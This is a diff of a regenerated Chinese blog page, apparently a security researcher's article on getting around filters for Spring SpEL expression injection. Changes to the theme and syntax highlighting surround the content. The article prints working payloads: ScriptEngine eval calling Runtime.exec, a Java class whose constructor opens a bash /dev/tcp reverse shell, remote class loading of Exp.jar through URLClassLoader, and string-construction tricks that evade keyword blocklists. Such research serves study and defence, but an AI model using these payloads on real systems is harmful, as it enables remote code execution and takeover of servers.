+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">sem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br><span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> sem.getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>);<br>System.out.println(engine.eval(<span class="hljs-string">&quot;2+1&quot;</span>));<br></code></pre></td></tr></table></figure>
 
 <p>那么payload也就显而易见</p>
 <p><code>nashorn</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p><code>javascript</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065405-5cc4be22-77bc-1.jpg" srcset="/img/loading.gif" lazyload alt="image-20210224055228307"></p>
 <p>OK基础的第一部分到此结束</p>
@@ -326,14 +377,14 @@
 <p>调用思路 : 远程加载class文件，通过函数调用或者静态代码块来调用</p>
 <p>先构造一份Exp.jar , 放到远程vps即可</p>
 <p>一份通过构造方法反弹shell的Exp.java实例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exp</span><span class="hljs-params">(String address)</span></span>&#123;<br>        address = address.replace(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br>        ProcessBuilder p = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span>+address+<span class="hljs-string">&quot;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            p.start();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exp</span><span class="hljs-params">(String address)</span>&#123;<br>        address = address.replace(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span>+address+<span class="hljs-string">&quot;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            p.start();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>起一个http服务示例</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python -m SimpleHTTPServer 8990<br></code></pre></td></tr></table></figure>
 
 <p>Payload</p>
 <p>注意必须使用全限定类名 , 或许这个可以过一些bypass</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> java.net.URLClassLoader(<span class="hljs-keyword">new</span> java.net.URL[]&#123;<span class="hljs-keyword">new</span> java.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065406-5d4cad6e-77bc-1.jpg" srcset="/img/loading.gif" lazyload alt="image-20210224033722685"></p>
 <h3 id="05-AppClassLoader"><a href="#05-AppClassLoader" class="headerlink" title="05 : AppClassLoader"></a>05 : AppClassLoader</h3><blockquote>
@@ -349,7 +400,7 @@
 <p>  由于需要调用到静态方法所以还是要用到<code>T()</code>操作</p>
   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)<br></code></pre></td></tr></table></figure></li>
 <li><p>加载ProcessBuilder执行</p>
-  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructors()[<span class="hljs-number">1</span>].newInstance(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure></li>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructors()[<span class="hljs-number">1</span>].newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure></li>
 </ul>
 <h3 id="06-通过其他类获取AppClassLoader"><a href="#06-通过其他类获取AppClassLoader" class="headerlink" title="06: 通过其他类获取AppClassLoader"></a>06: 通过其他类获取AppClassLoader</h3><p>这里我新开一个标题原因是在实际的web项目开发者会导入很多依赖的jar，或编写自定义类</p>
 <p><strong>实例1:</strong></p>
@@ -380,7 +431,7 @@
 <p>1.<code>T(类名).getName()</code>会返回字符串类型的全限定类名</p>
 <p>比如:<code>[[$&#123;T(String).getName()&#125;]]</code>结果为java.lang.String</p>
 <p>然后我们就可以使用角标来构造我们想要的字符串</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">[[$&#123;T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">51</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">122</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">49</span>)&#125;]]<br>#回显h3zh1<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">[[$&#123;T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">51</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">122</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">49</span>)&#125;]]<br>#回显h3zh1<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065408-5e554ed2-77bc-1.jpg" srcset="/img/loading.gif" lazyload alt="image-20210224051129248"></p>
 <p>2.使用Character类构造字符串</p>
@@ -390,10 +441,10 @@
 <p>3.外部可控字符绕过</p>
 <p>通过web请求构造字符串,request有很多方法返回值为String也有String[]用来给getMethod或者getDeclaredMethod的方法定制参数</p>
 <p><strong>post方法构造字符串</strong></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,51)%2b#request.getMethod().substring(0,1).replace(80,122)%2b#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,49)<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">51</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">122</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">49</span>)<br></code></pre></td></tr></table></figure>
 
 <p><strong>get方法构造字符串</strong></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,51)%2b#request.getMethod().substring(0,1).replace(71,122)%2b#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,49)<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">51</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">122</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">49</span>)<br></code></pre></td></tr></table></figure>
 
 <p><strong>外部的cookie绕过</strong></p>
 <p><code>[[$&#123;#request.getRequestedSessionId()&#125;]]</code></p>
@@ -405,26 +456,66 @@
 <p>SpringSpel注入漏洞利用 : <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;idx=1&amp;mid=2650174018&amp;sn=94cd324370afc2024346f7c508ff77dd">https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;idx=1&amp;mid=2650174018&amp;sn=94cd324370afc2024346f7c508ff77dd</a></p>
 <p>DDCTF-2020-WEB-WriteUp : <a target="_blank" rel="noopener" href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/">https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/</a></p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
                 
               </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
               
-                <p class="note note-warning">
-                  
-                    文章转载请联系博主 : hanjun_1221@163.com
-                  
-                </p>
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fastjson反序列化</div>
+      <div>http://example.com/2021/03/11/javasec/SPEL表达式绕过研究/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何止</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年3月11日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
               
-              
-                <div class="post-prevnext">
+                <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/04/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/">
+                      <a href="/2021/04/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="记录一次校内渗透">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">记录一次校内渗透</span>
                         <span class="visible-mobile">上一篇</span>
@@ -434,7 +525,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/11/javasec/%E8%AE%A4%E8%AF%86AspectJWeaver/">
+                      <a href="/2021/03/11/javasec/%E8%AE%A4%E8%AF%86AspectJWeaver/" title="认识AspectJWeaver">
                         <span class="hidden-mobile">认识AspectJWeaver</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -446,63 +537,88 @@
             </div>
 
             
-              <!-- Comments -->
-              <article class="comments" id="comments" lazyload>
-                
-                  
-                
-                
+  <article id="comments" lazyload>
+    
   <div id="valine"></div>
   <script type="text/javascript">
-    Fluid.utils.lazyComments('valine', function() {
-      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#valine",
-          app_id: "IxFMlnhlVtQfoUGr9ijp8odV-gzGzoHsz",
-          app_key: "PgOqIqKdyrNfiySdX8j4YeV0",
-          placeholder: "说点什么",
-          path: window.location.pathname,
-          avatar: "retro",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: true,
-          recordIP: true,
-          serverURLs: "https://ixfmlnhl.lc-cn-n1-shared.com",
-        });
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"IxFMlnhlVtQfoUGr9ijp8odV-gzGzoHsz","appKey":"PgOqIqKdyrNfiySdX8j4YeV0","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://ixfmlnhl.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appid":"IxFMlnhlVtQfoUGr9ijp8odV-gzGzoHsz","appkey":"PgOqIqKdyrNfiySdX8j4YeV0"},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
       });
     });
   </script>
-  <noscript>Please enable JavaScript to view the
-    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
-  </noscript>
+  <noscript>Please enable JavaScript to view the comments</noscript>
 
 
-              </article>
-            
+  </article>
+
+
           </article>
         </div>
       </div>
     </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
   <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
   <div class="toc-body" id="toc-body"></div>
 </div>
 
-      </div>
-    
+
+
+  </aside>
+
+
+    </div>
   </div>
 </div>
 
-<!-- Custom -->
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
 
 
     
 
     
-      <a id="scroll-top-button" href="#" role="button">
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
         <i class="iconfont icon-arrowup" aria-hidden="true"></i>
       </a>
     
@@ -521,57 +637,59 @@
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
+
     
 
     
   </main>
 
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-    坚持是心猿意马，一步三停，却还会往前走
-  </div>
+  <footer>
+    <div class="footer-inner">
   
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- LeanCloud 统计PV -->
-        <span id="leancloud-site-pv-container" style="display: none">
-            总访问量 
-            <span id="leancloud-site-pv"></span>
-             次
-          </span>
-      
-      
-        <!-- LeanCloud 统计UV -->
-        <span id="leancloud-site-uv-container" style="display: none">
-            总访客数 
-            <span id="leancloud-site-uv"></span>
-             人
-          </span>
-      
-
-    
-  </div>
-
-
+    <div class="footer-content">
+      坚持是心猿意马，一步三停，却还会往前走
+    </div>
+  
+  
+    <div class="statistics">
+  
   
 
   
-</footer>
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
 
+  
+</div>
 
-  <!-- SCRIPTS -->
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
   
   <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
@@ -587,11 +705,26 @@
 
 <script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
 <script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
 <script  src="/js/events.js" ></script>
 <script  src="/js/plugins.js" ></script>
 
-<!-- Plugins -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
 
 
   
@@ -600,72 +733,90 @@
 
 
 
+
   
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
 
 
+  <script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js></script>
 
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  <script>Fluid.plugins.codeWidget();</script>
 
 
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
 
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
 
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
-
-
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
+  <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/local-search.xml";
-      $('#local-search-input').on('click', function() {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      });
-      $('#modalSearch').on('shown.bs.modal', function() {
-        $('#local-search-input').focus();
-      });
-    })()
-  </script>
+
+  <script defer src="/js/leancloud.js" ></script>
 
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
 <script  src="/js/boot.js" ></script>
 
 
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
